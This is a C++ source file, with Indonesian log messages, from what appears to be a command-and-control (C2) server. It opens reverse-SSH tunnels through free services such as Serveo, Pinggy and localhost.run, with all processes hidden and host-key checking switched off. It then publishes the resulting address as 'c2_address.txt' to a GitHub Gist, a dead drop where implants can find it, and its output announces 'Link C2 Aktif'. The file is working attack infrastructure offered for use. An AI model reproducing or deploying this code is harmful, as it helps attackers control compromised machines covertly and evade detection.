#include "../include/tunnel_manager.h"
#include "../include/common_state.h"
#include <fstream>
#include <algorithm>
#include <thread>
#include <chrono>
#include <cstring>
#include <sstream>
#include "../include/ui_manager.h"

#ifdef _WIN32
#include <windows.h>
#include <psapi.h>
#endif

// Implementation of Helper Process execution (Zero-Window)
bool StartDetachedProcess(const std::string& cmdLine) {
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Pastikan tidak ada jendela muncul
    
    PROCESS_INFORMATION pi = {};

    std::string fullCmd = "cmd.exe /c \"" + cmdLine + "\"";
    char* cmdBuf = _strdup(fullCmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    free(cmdBuf);
    return false;
}

// Synchronous Helper Process execution (Zero-Window, Waits for exit)
bool RunHiddenProcessSync(const std::string& cmdLine) {
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {};
    std::string fullCmd = "cmd.exe /c \"" + cmdLine + "\"";
    char* cmdBuf = _strdup(fullCmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return exitCode == 0;
    }
    free(cmdBuf);
    return false;
}

bool IsProcessRunning(const std::string& processName) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
    cProcesses = cbNeeded / sizeof(DWORD);
    for (unsigned int i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
            if (NULL != hProcess) {
                HMODULE hMod;
                DWORD cbNeeded2;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded2)) {
                    GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
                }
                CloseHandle(hProcess);
                if (processName == std::string(szProcessName)) return true;
            }
        }
    }
    return false;
}

void EnsureSSHKey() {
    std::string user_profile = getenv("USERPROFILE");
    std::string ssh_dir = user_profile + "\\.ssh";
    std::string key_path = ssh_dir + "\\id_rsa";
    
    // Check if key exists
    std::ifstream f(key_path);
    if (!f.good()) {
        std::cout << INFO_TAG << "Menyiapkan SSH Key baru..." << std::endl;
        CreateDirectoryA(ssh_dir.c_str(), NULL);
        std::string gen_cmd = "ssh-keygen -t rsa -N \"\" -f \"" + key_path + "\"";
        if (RunHiddenProcessSync(gen_cmd)) {
            std::cout << SUCCESS_TAG << "SSH Key berhasil dibuat." << std::endl;
        } else {
            std::cout << ERROR_TAG << "Gagal membuat SSH Key otomatis." << std::endl;
            return;
        }
    }
}

void StartTunnelAndGetUrl(int port, std::string& public_url, TunnelType type) {
    global_public_url = "None";
    global_gist_success = false;

    bool alreadyRunning = IsProcessRunning(LOCALTONET_EXE) || IsProcessRunning(SSH_EXE);
    if (alreadyRunning && !global_public_url.empty() && global_public_url != "None") {
        public_url = global_public_url;
        std::cout << SUCCESS_TAG << "Menggunakan Tunnel aktif: " << CYAN << public_url << RESET << std::endl;
        return;
    }

    CleanupSystem();
    EnsureSSHKey();

    std::string cmd;
    std::string provider_name;

    if (type == TunnelType::LOCALTONET) {
        provider_name = "LocalToNet";
        std::string localtonet_path = "tools\\" + std::string(LOCALTONET_EXE);
        std::string token = std::string(LOCALTONET_TOKEN);
        cmd = localtonet_path;
        if (!token.empty() && token != "YOUR_TOKEN" && token != "2002202") {
            cmd += " --authtoken " + token;
        }
    } else if (type == TunnelType::PINGGY) {
        provider_name = "Pinggy.io";
        std::string token = std::string(PINGGY_TOKEN);
        std::string ssh_target = "tcp@free.pinggy.io";
        if (!token.empty() && token != "YOUR_TOKEN") {
            ssh_target = token + "+" + ssh_target;
        }
        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -p 443 -R0:localhost:" + std::to_string(port) + " " + ssh_target + "\"";
    } else if (type == TunnelType::SERVEO) {
        provider_name = "Serveo.net";
        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 0:localhost:" + std::to_string(port) + " serveo.net\"";
    } else if (type == TunnelType::LOCALHOST_RUN) {
        provider_name = "Localhost.run";
        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 80:localhost:" + std::to_string(port) + " ssh.localhost.run\"";
    }

    // --- SYNCHRONOUS MEMORY-BASED HANDSHAKE ---
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        std::cout << ERROR_TAG << "Gagal membuat pipe untuk handshake!" << std::endl;
        return;
    }

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    char* cmdBuf = _strdup(cmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        CloseHandle(hWrite);

        std::cout << INFO_TAG << "Handshake [" << provider_name << " (Sync)]... " << std::flush;
        
        bool success = false;
        std::string capturedOutput;
        char buffer[1024];
        DWORD bytesRead;
        
        auto start_time = std::chrono::steady_clock::now();
        while (true) {
            DWORD exitCode;
            if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) break;

            DWORD avail = 0;
            if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    capturedOutput += buffer;
                    
                    if (type == TunnelType::LOCALTONET) {
                        size_t pos = capturedOutput.find("ADDED");
                        if (pos != std::string::npos) {
                            size_t start = capturedOutput.find_first_not_of(" \t", pos + 5);
                            size_t end = capturedOutput.find("TCP", start);
                            if (start != std::string::npos && end != std::string::npos) {
                                public_url = capturedOutput.substr(start, end - start);
                                success = true;
                            }
                        }
                    } else if (type == TunnelType::PINGGY) {
                        size_t pos = capturedOutput.find("tcp://");
                        if (pos != std::string::npos) {
                            size_t end = capturedOutput.find(".link:", pos);
                            if (end != std::string::npos) {
                                size_t port_end = capturedOutput.find_first_of(" \n\r\t", end + 6);
                                public_url = capturedOutput.substr(pos, port_end - pos);
                                success = true;
                            }
                        }
                    } else if (type == TunnelType::SERVEO || type == TunnelType::LOCALHOST_RUN) {
                        size_t pos_srveo = capturedOutput.find("Forwarding TCP connections from ");
                        if (pos_srveo == std::string::npos) pos_srveo = capturedOutput.find("Forwarding SSH traffic from ");
                        
                        size_t pos_lhr = capturedOutput.find(".lhr.life");
                        
                        if (pos_srveo != std::string::npos) {
                            size_t start = capturedOutput.find("from ", pos_srveo) + 5;
                            size_t end = capturedOutput.find_first_of(" \n\r\t", start);
                            public_url = capturedOutput.substr(start, end - start);
                            success = true;
                        } else if (pos_lhr != std::string::npos) {
                            // Localhost.run cleaner extraction (Skip banner/username)
                            size_t start = capturedOutput.rfind(" ", pos_lhr);
                            if (start == std::string::npos || (pos_lhr - start) > 50) 
                                start = capturedOutput.rfind("\n", pos_lhr);
                                
                            if (start == std::string::npos) start = 0; else start++;
                            
                            size_t end = capturedOutput.find_first_of(" \n\r\t", pos_lhr);
                            public_url = capturedOutput.substr(start, end - start);
                            
                            // Remove "user" or "tun-" prefix if mistakenly caught
                            if (public_url.find("user") != std::string::npos) public_url = public_url.substr(4);
                            if (public_url.find("tun-") != std::string::npos) public_url = public_url.substr(4);
                            
                            success = true;
                        }
                    }

                    if (success) {
                        // REFINED SANITIZATION: Remove ALL whitespace, newlines, and carriage returns
                        if (public_url.find("tcp://") == 0) public_url = public_url.substr(6);
                        public_url.erase(std::remove(public_url.begin(), public_url.end(), '\n'), public_url.end());
                        public_url.erase(std::remove(public_url.begin(), public_url.end(), '\r'), public_url.end());
                        public_url.erase(std::remove(public_url.begin(), public_url.end(), ' '), public_url.end());
                        public_url.erase(public_url.find_last_not_of(" \n\r\t") + 1);
                        
                        // AUTO-PORT: If no port is assigned, append :80 (Professional standard for LHR/SSH)
                        if (public_url.find(':') == std::string::npos && !public_url.empty()) {
                            public_url += ":80";
                        }
                        
                        global_public_url = public_url;
                        std::cout << " [SIP]" << std::endl;
                        std::cout << SUCCESS_TAG << "Link C2 Aktif: " << CYAN << public_url << RESET << std::endl;
                        
                        // Async cloud sync so terminal returns immediately
                        std::thread gist_thread(UpdateGitHubGist, public_url);
                        gist_thread.detach();
                        break;
                    }
                }
            }

            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count() > 45) break;
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

        if (!success) {
            std::cout << " [GAGAL]" << std::endl;
            std::cout << ERROR_TAG << "Tunnel Handshake Gagal! Pastikan Koneksi stabil atau SSH Key terdaftar." << std::endl;
            if (!capturedOutput.empty()) {
                std::cout << GRAY << "Debug Info: " << capturedOutput.substr(0, 150) << (capturedOutput.length() > 150 ? "..." : "") << RESET << std::endl;
            }
        }

        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        free(cmdBuf);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        std::cout << ERROR_TAG << "Gagal menjalankan tunnel process!" << std::endl;
    }
}

std::string GetDetailedTunnelLogs() {
    return "Handshake performed via memory pipes. Current URL: " + global_public_url;
}

void UpdateGitHubGist(const std::string& public_url) {
    if (public_url.empty() || std::string(GIST_ID) == "YOUR_GIST_ID") return;
    
    std::cout << INFO_TAG << "Sinkronisasi Cloud (GitHub Gist) berjalan di latar belakang..." << std::endl;

    std::string payload = "{\"files\": {\"c2_address.txt\": {\"content\": \"" + public_url + "\"}}}";
    std::string payloadPath = "gist_" + std::to_string(GetTickCount()) + ".json";
    std::ofstream out(payloadPath);
    out << payload;
    out.close();

    std::string cmd = "curl -X PATCH -H \"Accept: application/vnd.github.v3+json\" ";
    cmd += "-H \"Authorization: token " + std::string(GITHUB_TOKEN) + "\" ";
    cmd += "-d @\"" + payloadPath + "\" https://api.github.com/gists/" + std::string(GIST_ID) + " -s -o NUL";
    
    bool res = RunHiddenProcessSync(cmd);
    remove(payloadPath.c_str());
    global_gist_success = res;
    
    if (global_gist_success) {
        std::cout << SUCCESS_TAG << " Github Gist Cloud Database Synchronized: (" << public_url << ")" << std::endl;
    } else {
        std::cout << ERROR_TAG << " Gagal melakukan sinkronisasi dengan GitHub Gist!" << std::endl;
    }
}

void CleanupSystem() {
    RunHiddenProcessSync("taskkill /IM " + std::string(LOCALTONET_EXE) + " /F >NUL 2>&1");
    RunHiddenProcessSync("taskkill /IM ssh.exe /F >NUL 2>&1");
    global_public_url = "None";
}
